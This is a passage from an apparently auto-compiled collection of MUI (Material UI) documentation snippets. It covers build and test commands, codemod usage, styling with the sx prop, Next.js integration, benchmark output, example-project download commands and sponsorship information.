https://github.com/mui/material-ui/blob/master/apps/pigment-css-next-app/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm build\n```\n\n----------------------------------------\n\nTITLE: End-to-End Testing Commands for Material-UI\nDESCRIPTION: List of npm commands available for running end-to-end tests, including development, full run, build, and server commands.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/e2e/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm test:e2e        # Full run\npnpm test:e2e:dev    # Prepares the fixtures for watchmode\npnpm test:e2e:run    # Runs the tests\npnpm test:e2e:build  # Builds webpack bundle for fixtures\npnpm test:e2e:server # Serves the fixture bundle\n```\n\n----------------------------------------\n\nTITLE: Embedding JSX UI Component within Info Callout - JSX\nDESCRIPTION: Presents a React functional component that imports MUI's Stack component and displays it within an info callout block, demonstrating how to include live code snippets and usage examples inside styled documentation containers. Dependencies include React and '@mui/material/Stack'. The component accepts no parameters and simply renders a Stack with full width and default spacing, expected to be displayed as a working example within a documentation context.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/callouts.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\\nimport Stack from '@mui/material/Stack';\\n\\nexport default function BasicAlerts() {\\n  return <Stack sx={{ width: '100%' }} spacing={2} />;\\n}\n```\n\n----------------------------------------\n\nTITLE: Using sx prop with theme variables\nDESCRIPTION: Demonstrates using theme variables with the sx prop in both long and shorthand syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/using-css-variables/using-css-variables.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n// Outputs 'var(--joy-shadow-sm)'\n<Chip sx={(theme) => ({ boxShadow: theme.vars.shadow.sm })} />\n```\n\nLANGUAGE: js\nCODE:\n```\n<Chip\n  sx={{\n    border: '1px solid',\n\n    // For color properties, lookup from `theme.vars.palette`\n    color: 'neutral.800', // 'var(--joy-palette-neutral-800)'\n    borderColor: 'neutral.400', // 'var(--joy-palette-neutral-400)'\n\n    // lookup from `theme.vars.shadow`\n    shadow: 'sm', // 'var(--joy-shadow-sm)'\n\n    // lookup from `theme.vars.fontSize`\n    fontSize: 'sm', // 'var(--joy-fontSize-sm)'\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Managing Overflow in Material-UI\nDESCRIPTION: Examples of overflow property implementation to handle content that exceeds its container. This shows how to hide overflowing content or enable scrolling within a container.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Box component=\"div\" sx={{ overflow: 'hidden' }}>\n  Not scrollable, overflow is hidden\n</Box>\n<Box component=\"div\" sx={{ overflow: 'auto' }}>\n  Try scrolling this overflow auto box\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Running the import-path codemod for v0.15.0\nDESCRIPTION: Command to execute the codemod that updates import paths for Material UI v0.15.0's reorganized folder structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_131\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v0.15.0/import-path <path>\n```\n\n----------------------------------------\n\nTITLE: Creating New Feedback Entry\nDESCRIPTION: cURL command to create a new feedback entry by posting JSON data to the API endpoint.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/feedback/README.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncurl -H \"Content-Type: application/json\" -X POST --data @example.json <API-URL>/feedback\n```\n\n----------------------------------------\n\nTITLE: Applying Text Transformations in Material-UI with JSX\nDESCRIPTION: Illustrates how to apply text transformations (capitalize, lowercase, uppercase) using the Box component in Material-UI. This affects the casing of the text content.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ textTransform: 'capitalize' }}>…\n<Box sx={{ textTransform: 'lowercase' }}>…\n<Box sx={{ textTransform: 'uppercase' }}>…\n```\n\n----------------------------------------\n\nTITLE: Calculating Grid Item Width using CSS Variables in JavaScript\nDESCRIPTION: Shows a JavaScript object representing CSS rules where a grid item's width is calculated using the CSS `calc()` function and a CSS variable `--Grid-columns` provided by its container. This approach, used in Grid v2, simplifies the logic compared to Grid v1.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/build-layouts-faster-with-grid-v2.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n{\n  // --Grid-columns is defined in the grid container\n  width: `calc(100% * ${value} / var(--Grid-columns))`,\n}\n```\n\n----------------------------------------\n\nTITLE: Triggering CircleCI Bundling Workflow for Material-UI PR\nDESCRIPTION: A curl command to trigger the bundling workflow in CircleCI for a specific PR. The command uses the CircleCI API to initiate a pipeline run with parameters to specifically run the bundling workflow. A personal Circle token is required as an environment variable.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/bundling/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n  --url https://circleci.com/api/v2/project/gh/mui/material-ui/pipeline \\\n  --header 'content-type: application/json' \\\n  --header 'Circle-Token: $CIRCLE_TOKEN' \\\n  --data-raw '{\"branch\":\"pull/24289/head\",\"parameters\":{\"workflow\":\"bundling\"}}'\n```\n\n----------------------------------------\n\nTITLE: Adding Responsive Meta Tag in HTML\nDESCRIPTION: This HTML snippet shows how to add a responsive viewport meta tag to ensure proper rendering and touch zooming across all devices.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/usage/usage.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"viewport\" content=\"initial-scale=1, width=device-width\" />\n```\n\n----------------------------------------\n\nTITLE: Class Name Prefix Example\nDESCRIPTION: Example showing how class name prefixes work with both Joy UI and Material UI components, demonstrating potential styling conflicts due to shared class names.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/material-ui/material-ui.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport MaterialTypography, {\n  typographyClasses as materialTypographyClasses,\n} from '@mui/material/Typography';\nimport JoyTypography, {\n  typographyClasses as joyTyographyClasses,\n} from '@mui/joy/Typography';\nimport Stack from '@mui/material/Stack';\n\n<Stack\n  sx={{\n    // similar to `& .${joyTyographyClasses.root}`\n    [`& .${materialTypographyClasses.root}`]: {\n      color: 'red',\n    },\n  }}\n>\n  {/* Both components are red. */}\n  <MaterialTypography>Red</MaterialTypography>\n  <JoyTypography>Red</JoyTypography>\n</Stack>;\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Class Component for Tooltip in React\nDESCRIPTION: This snippet shows how to create a custom class component that can be used with a Tooltip. It demonstrates the proper way to forward refs and wrap the component to ensure compatibility with the Tooltip component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/tooltips/tooltips.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\nclass MyComponent extends React.Component {\n  render() {\n    const { innerRef, ...props } = this.props;\n    //  Spread the props to the underlying DOM element.\n    return (\n      <div {...props} ref={innerRef}>\n        Bin\n      </div>\n    );\n  }\n}\n\n// Wrap MyComponent to forward the ref as expected by Tooltip\nconst WrappedMyComponent = React.forwardRef(function WrappedMyComponent(props, ref) {\n  return <MyComponent {...props} innerRef={ref} />;\n});\n\n// ...\n\n<Tooltip title=\"Delete\">\n  <WrappedMyComponent />\n</Tooltip>;\n```\n\n----------------------------------------\n\nTITLE: Running MUI Codemod for sx Prop Callback Migration (Bash)\nDESCRIPTION: Provides the bash command using `npx` to execute the Material UI codemod (`@mui/codemod@latest v6.0.0/sx-prop`). This tool automatically refactors code from the deprecated `sx` prop callback syntax to the new syntax in the specified files or folders.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/sx-prop path/to/file-or-folder\n```\n\n----------------------------------------\n\nTITLE: Installing Blog Template Dependencies for Material-UI\nDESCRIPTION: List of required dependencies for the Blog template project. These packages need to be installed to ensure proper functionality of the template.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/templates/blog/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n@mui/material, @mui/icons-material, @emotion/styled, @emotion/react, markdown-to-jsx\n```\n\n----------------------------------------\n\nTITLE: Importing useButton Hook from MUI Base\nDESCRIPTION: Demonstrates importing the useButton hook from the unstyled components package. This hook provides button functionality without styles for maximum customization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q3-update.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useButton } from '@mui/base/ButtonUnstyled';\n```\n\n----------------------------------------\n\nTITLE: Configuring _document.tsx for Material UI with Next.js Pages Router\nDESCRIPTION: Diff showing how to modify the _document.tsx file to integrate Material UI with Next.js Pages Router using DocumentHeadTags and documentGetInitialProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n+import {\n+  DocumentHeadTags,\n+  documentGetInitialProps,\n+} from '@mui/material-nextjs/v15-pagesRouter';\n // or `v1X-pagesRouter` if you are using Next.js v1X\n\n export default function MyDocument(props) {\n   return (\n     <Html lang=\"en\">\n       <Head>\n+        <DocumentHeadTags {...props} />\n         ...\n       </Head>\n       <body>\n         <Main />\n         <NextScript />\n       </body>\n     </Html>\n   );\n }\n\n+MyDocument.getInitialProps = async (ctx) => {\n+  const finalProps = await documentGetInitialProps(ctx);\n+  return finalProps;\n+};\n```\n\n----------------------------------------\n\nTITLE: Running @mui/styles Synthetic Benchmark\nDESCRIPTION: Command to run the MUI styles benchmark with performance comparisons between different styling approaches including JSS, styled-components, Emotion, and various MUI styling implementations. EmotionCssButton and Naked components show the highest performance.\nSOURCE: https://github.com/mui/material-ui/blob/master/benchmark/server/README.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\npnpm server:styles\n\nBox x 3,850 ops/sec ±3.58% (178 runs sampled)\nJSS naked x 35,493 ops/sec ±2.29% (183 runs sampled)\nWithStylesButton x 16,844 ops/sec ±0.34% (191 runs sampled)\nHookButton x 23,213 ops/sec ±0.88% (191 runs sampled)\nStyledComponentsButton x 7,442 ops/sec ±2.09% (180 runs sampled)\nEmotionButton x 11,345 ops/sec ±2.45% (185 runs sampled)\nEmotionCssButton x 53,807 ops/sec ±0.40% (191 runs sampled)\nEmotionServerCssButton x 43,701 ops/sec ±1.04% (190 runs sampled)\nNaked x 58,694 ops/sec ±0.86% (188 runs sampled)\n```\n\n----------------------------------------\n\nTITLE: Updating Core Styles Import in React\nDESCRIPTION: Renames private import from 'core/styles/*' to 'core/styles'. This codemod updates the import statement to use the new structure in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_77\n\nLANGUAGE: diff\nCODE:\n```\n-import { darken, lighten } from '@material-ui/core/styles/colorManipulator';\n+import { darken, lighten } from '@material-ui/core/styles';\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/core-styles-import <path>\n```\n\n----------------------------------------\n\nTITLE: Benchmark Results Output\nDESCRIPTION: Sample output showing performance metrics for various UI scenarios including baseline, grid systems, tables, React components, and styling solutions. Results are shown in milliseconds or percentage with margin of error.\nSOURCE: https://github.com/mui/material-ui/blob/master/benchmark/browser/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnoop (baseline):\n  02.53 ±00.11ms\nGrid (html):\n  28.34 ±01.80ms\nGrid System:\n  167 ±2%\nGrid Material UI:\n  179 ±1%\nTable:\n  128 ±3%\nReact primitives:\n  54 ±1%\nReact components:\n  58 ±1%\nStyled MUI:\n  94 ±1%\nStyled emotion:\n  96 ±1%\nStyled SC:\n  94 ±1%\nmakeStyles:\n  83 ±0%\nBox Baseline:\n  106 ±1%\nBox MUI:\n  180 ±1%\nBox Theme-UI:\n  201 ±1%\nBox Chakra-UI:\n  131 ±1%\nstyled-components Box + @mui/system:\n  184 ±3%\nstyled-components Box + styled-system:\n  154 ±3%\n```\n\n----------------------------------------\n\nTITLE: Downloading and Extracting Project Example\nDESCRIPTION: Commands to download and extract the Material UI example project with Create React App and styled-components in TypeScript.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-styled-components-ts/README.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra-styled-components-ts\ncd material-ui-cra-styled-components-ts\n```\n\n----------------------------------------\n\nTITLE: Displaying GitHub Avatar using HTML img Tag\nDESCRIPTION: Embeds a GitHub user's avatar image using an HTML `<img>` tag sourced from GitHub avatars. Inline CSS styles are applied via the `style` attribute to control the maximum width (160px), remove default margins (`margin: unset`), add bottom margin (24px), and apply slightly rounded corners (2px).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q3-update.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"https://avatars.githubusercontent.com/u/4512430?s=320\" alt=\"marija\" style=\"max-width: 160px; margin: unset; margin-bottom: 24px; border-radius: 2px;\" />\n```\n\n----------------------------------------\n\nTITLE: Triggering CircleCI Pipeline for Testing with React@next in Material-UI\nDESCRIPTION: This bash command triggers a CircleCI pipeline to run tests using React@next for a specific pull request in the Material-UI project. It requires a CircleCI personal access token and the pull request number.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/README.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n  --url https://circleci.com/api/v2/project/gh/mui/material-ui/pipeline \\\n  --header 'content-type: application/json' \\\n  --header 'Circle-Token: $CIRCLE_TOKEN' \\\n  --data-raw '{\"branch\":\"pull/24289/head\",\"parameters\":{\"react-version\":\"next\"}}'\n```\n\n----------------------------------------\n\nTITLE: Installing Material-UI v0.x and v1.x Side by Side with Yarn\nDESCRIPTION: Shows how to install both Material-UI versions simultaneously using Yarn package manager to facilitate a gradual migration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nyarn add material-ui\nyarn add @material-ui/core\n```\n\n----------------------------------------\n\nTITLE: Downloading Material UI Vite TypeScript Example\nDESCRIPTION: Commands to download and extract the Material UI Vite TypeScript example project from GitHub repository.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-vite-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-vite-ts\ncd material-ui-vite-ts\n```\n\n----------------------------------------\n\nTITLE: Installing Styled Components Type Definitions\nDESCRIPTION: Command to install TypeScript type definitions for styled-components as a development dependency.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-styled-components-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev @types/styled-components\n```\n\n----------------------------------------\n\nTITLE: Configuring CSS Injection Order with Emotion Cache\nDESCRIPTION: Shows how to set up a custom Emotion cache with the prepend option to ensure correct CSS injection order when using Emotion with Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_13\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { CacheProvider } from '@emotion/react';\nimport createCache from '@emotion/cache';\n\nconst cache = createCache({\n  key: 'css',\n  prepend: true,\n});\n\nexport default function CssModulesPriority() {\n  return (\n    <CacheProvider value={cache}>\n      {/* Your component tree. Now you can override Material UI's styles. */}\n    </CacheProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Non-Working Responsive Grid Example\nDESCRIPTION: Example of an incorrect implementation where a grid item is missing a breakpoint value that exists in the container, causing layout issues.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<Grid container columns={{ xs: 4, md: 12 }}>\n  <Grid size={{ xs: 2 }} />\n</Grid>\n```\n\n----------------------------------------\n\nTITLE: Adding Image Description in HTML\nDESCRIPTION: This HTML snippet adds a description for the cat collage image using a paragraph with a specific class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2022-tenerife-retreat.md#2025-04-22_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<p class=\"blog-description\">The cat was responsible for all of the cutest moments during the retreat.</p>\n```\n\n----------------------------------------\n\nTITLE: Configuring Web Crawler Access with robots.txt\nDESCRIPTION: This is a standard robots.txt file that specifies access rules for web crawlers. It includes a reference to the robots.txt standard and allows all user agents full access to the site with no restrictions.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-styled-components-ts/public/robots.txt#2025-04-22_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n# https://www.robotstxt.org/robotstxt.html\nUser-agent: *\nDisallow:\n```\n\n----------------------------------------\n\nTITLE: DynamoDB On-Demand Throughput Configuration\nDESCRIPTION: Configuration parameter for setting up DynamoDB with on-demand throughput instead of provisioned throughput.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/feedback/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n  --billing-mode PAY_PER_REQUEST \\\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Project\nDESCRIPTION: Commands to download and extract the Material UI Next.js Pages Router example project from GitHub repository.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs-pages-router/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs-pages-router\ncd material-ui-nextjs-pages-router\n```\n\n----------------------------------------\n\nTITLE: Running Divider Props Codemod Command\nDESCRIPTION: Command to automatically update deprecated Divider props in a codebase using MUI's codemod tool.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/divider-props <path>\n```\n\n----------------------------------------\n\nTITLE: Downloading Material UI Next.js Pages Router TypeScript Example\nDESCRIPTION: Command to download the Material UI Next.js Pages Router TypeScript example from GitHub and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs-pages-router-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs-pages-router-ts\ncd material-ui-nextjs-pages-router-ts\n```\n\n----------------------------------------\n\nTITLE: Creating and Pushing Feature Branch\nDESCRIPTION: Commands for creating a new topic branch and pushing changes to your fork.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngit checkout -b my-topic-branch\ngit push -u origin HEAD\n```\n\n----------------------------------------\n\nTITLE: Displaying Teide Hike Image in HTML\nDESCRIPTION: This HTML snippet displays an image of the Teide hike from the MUI team retreat, with specified dimensions and lazy loading.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2022-tenerife-retreat.md#2025-04-22_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<img alt=\"The path leading down the hill from the sunset view, with Teide glowing red in the background.\" src=\"/static/blog/2022-tenerife-retreat/teide-hike.jpeg\" width=\"1440\" height=\"1920\" loading=\"lazy\" />\n```\n\n----------------------------------------\n\nTITLE: Restoring Old MUI JoyChip Default Props using extendTheme in JavaScript\nDESCRIPTION: Provides a theme customization snippet using `extendTheme` to revert the default props for the `JoyChip` component. It sets the default `variant` back to 'solid' and the default `color` back to 'primary'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyChip: {\n      defaultProps: {\n        variant: 'solid',\n        color: 'primary',\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Running Modal Props Codemod Command\nDESCRIPTION: Command to execute the modal-props codemod on a specified path. This removes deprecated disableBackdropClick and onEscapeKeyDown props from Modal components.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_98\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/modal-props <path>\n```\n\n----------------------------------------\n\nTITLE: CodeCov Logo HTML Implementation\nDESCRIPTION: HTML code for displaying the CodeCov logo using a simple img element with lazy loading.\nSOURCE: https://github.com/mui/material-ui/blob/master/README.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<img loading=\"lazy\" alt=\"CodeCov logo\" src=\"https://avatars.githubusercontent.com/u/8226205?s=105\" width=\"35\" height=\"35\">\n```\n\n----------------------------------------\n\nTITLE: Markdown Service and Sponsorship Documentation\nDESCRIPTION: Comprehensive markdown documentation detailing MUI's sponsorship structure, key service providers, and tier-specific benefits including logo placement and visibility across various platforms.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/discover-more/backers/backers.md#2025-04-22_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n### What's the difference between Open Collective and the for-profit?\n\nFunds donated via Open Collective are managed transparently and aimed to sustain the MIT projects.\nThe MUI non-profit organzation benefits from the Open Collective's fiscal sponsorship (hosted as a non-profit), in exchange for 10% of the donations.\n\nFunds transferred to the MUI for-profit organization support the company's mission.\n\n## Services\n\nThese great services sponsor our open-source projects:\n\n<span class=\"only-light-mode\">\n  <img src=\"/static/readme/github-lightmode.svg\" alt=\"GitHub logo\" loading=\"lazy\" width=\"300\" height=\"107\" style=\"width:80px; display: block; margin-bottom: 2px;\">\n</span>\n<span class=\"only-dark-mode\">\n  <img src=\"/static/readme/github-darkmode.svg\" alt=\"GitHub logo\" loading=\"lazy\" width=\"300\" height=\"107\" style=\"width:80px; display: block; margin-bottom: 2px;\">\n</span>\n\n[GitHub](https://github.com/) lets us host the Git repository and coordinate contributions.\n\n<span class=\"only-light-mode\">\n  <img src=\"/static/readme/netlify-lightmode.svg\" alt=\"Netlify logo\" loading=\"lazy\" width=\"180\" height=\"49\" style=\"width: 100px; margin-top: 1.2rem; margin-bottom: 2px; display: block;\">\n</span>\n<span class=\"only-dark-mode\">\n  <img src=\"/static/readme/netlify-darkmode.svg\" alt=\"Netlify logo\" loading=\"lazy\" width=\"180\" height=\"49\" style=\"width: 100px; margin-top: 1.2rem; margin-bottom: 2px; display: block;\">\n</span>\n\n[Netlify](https://www.netlify.com/) lets us distribute the documentation.\n\n<span class=\"only-light-mode\">\n  <img src=\"/static/readme/browserstack-lightmode.svg\" alt=\"BrowserStack logo\" loading=\"lazy\" width=\"180\" height=\"32\" style=\"width: 140px; margin-top: 1.2rem; margin-bottom: 2px; display: block;\">\n</span>\n<span class=\"only-dark-mode\">\n  <img src=\"/static/readme/browserstack-darkmode.svg\" alt=\"BrowserStack logo\" loading=\"lazy\" width=\"180\" height=\"32\" style=\"width: 140px; margin-top: 1.2rem; margin-bottom: 2px; display: block;\">\n</span>\n\n[BrowserStack](https://www.browserstack.com/) lets us test in real browsers.\n\n<img loading=\"lazy\" alt=\"CodeCov logo\" src=\"https://avatars.githubusercontent.com/u/8226205?s=210\" width=\"36\" height=\"36\" style=\"margin-top: 1.2rem; margin-bottom: 2px; display: block;\">\n\n[CodeCov](https://about.codecov.io/) lets us monitor test coverage.\n\n## Tier benefits\n\n### Diamond\n\nYour organization logo will be prominently featured:\n\n- on the sidebar of all content pages (4m+ sessions, 900k+ unique visitors/month)\n- the [homepage](https://mui.com/#sponsors) (500k+ pageviews and 150k+ unique visitors/month)\n- the [README.md](https://github.com/mui/material-ui#sponsors) (80k+ unique visitors/month)\n- the [Diamond sponsor list](#diamond-sponsors)\n\nPlease contact us at sponsoring@mui.com before subscribing to this tier to get preliminary approval.\n\n### Gold\n\nYour organization logo will be placed in:\n\n- the [homepage](https://mui.com/#sponsors) (500k+ pageviews and 150k+ unique visitors/month)\n- the [README.md](https://github.com/mui/material-ui#sponsors) (80k+ unique visitors/month)\n- the [Gold sponsor list](#gold-sponsors)\n\n\\*for backlink sponsors, your logo won't be visible.\n\n### Silver\n\nYour organization logo will be placed in the [Silver sponsor list](#silver-sponsors).\n\n### Bronze\n\nYour organization logo will be placed in the [Bronze sponsor list](#bronze-sponsors).\n\n### Backers\n\nHelp support more open-source development by becoming a Backer.\nWe'll thank you by including your avatar in the [backers list](#backers).\n```\n\n----------------------------------------\n\nTITLE: Downloading Material UI Remix TypeScript Example\nDESCRIPTION: Commands to download the Material UI Remix TypeScript example from GitHub and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-remix-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-remix-ts\ncd material-ui-remix-ts\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Proper GitHub Issue Title Format in Markdown\nDESCRIPTION: This snippet illustrates the correct and incorrect ways to format GitHub issue titles for Joy UI components. It emphasizes the importance of including the component name and providing a clear, succinct description.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/support/support.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n- ❌ _\"It doesn't work\"_\n- ✅ _\"[button] Add support for {{new feature}}\"_\n```\n\n----------------------------------------\n\nTITLE: Updating ImageListItemBar CSS Classes for Action Position Left\nDESCRIPTION: Transforms CSS selectors for ImageListItemBar's titleWrap when action position is left.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_44\n\nLANGUAGE: diff\nCODE:\n```\n- .MuiImageListItemBar-titleWrapActionPosLeft\n+.MuiImageListItemBar-actionPositionLeft > .MuiImageListItemBar-titleWrap\n```\n\n----------------------------------------\n\nTITLE: Material UI Browser Support Table in Markdown\nDESCRIPTION: Markdown table showing minimum version requirements for different browsers supported by Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/supported-platforms/supported-platforms.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| Edge   | Firefox | Chrome | Safari (macOS) | Safari (iOS) |\n| :----- | :------ | :----- | :------------- | :----------- |\n| >= 121 | >= 115  | >= 109 | >= 15.4        | >= 15.4      |\n```\n\n----------------------------------------\n\nTITLE: Downloading and Extracting Joy UI Example Project\nDESCRIPTION: Commands to download the Joy UI example project from the Material-UI GitHub repository and navigate to the project directory. Uses curl to fetch the code and tar to extract it.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/joy-ui-cra-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/joy-ui-cra-ts\ncd joy-ui-cra-ts\n```\n\n----------------------------------------\n\nTITLE: Running Local End-to-End Tests for Material-UI Docs in Bash\nDESCRIPTION: Commands to start the development docs server and run end-to-end tests locally. It includes an option for running tests in headed browsers using Playwright CLI.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/e2e-website/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm docs:dev\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm test:e2e-website\n```\n\nLANGUAGE: bash\nCODE:\n```\n--headed\n```\n\n----------------------------------------\n\nTITLE: Stack Component DOM Structure (HTML)\nDESCRIPTION: Shows the HTML structure of the Stack component which consists of a single root div element with the MuiStack-root class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stack/stack.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiStack-root\">\n  <!-- Stack contents -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Running Browser Benchmark Command\nDESCRIPTION: Command to execute browser-based performance benchmarks in the Material-UI project.\nSOURCE: https://github.com/mui/material-ui/blob/master/benchmark/browser/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm benchmark:browser\n```\n\n----------------------------------------\n\nTITLE: Updating InputBase CSS Classes\nDESCRIPTION: CSS selector transformations for the InputBase component, replacing old nested class selectors with proper parent-child relationship selectors for various input states.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_52\n\nLANGUAGE: diff\nCODE:\n```\n-.MuiInputBase-root .MuiInputBase-inputSizeSmall\n+.MuiInputBase-root.MuiInputBase-sizeSmall > .MuiInputBase-input\n-.MuiInputBase-root .MuiInputBase-inputMultiline\n+.MuiInputBase-root.MuiInputBase-multiline > .MuiInputBase-input\n-.MuiInputBase-root .MuiInputBase-inputAdornedStart\n+.MuiInputBase-root.MuiInputBase-adornedStart > 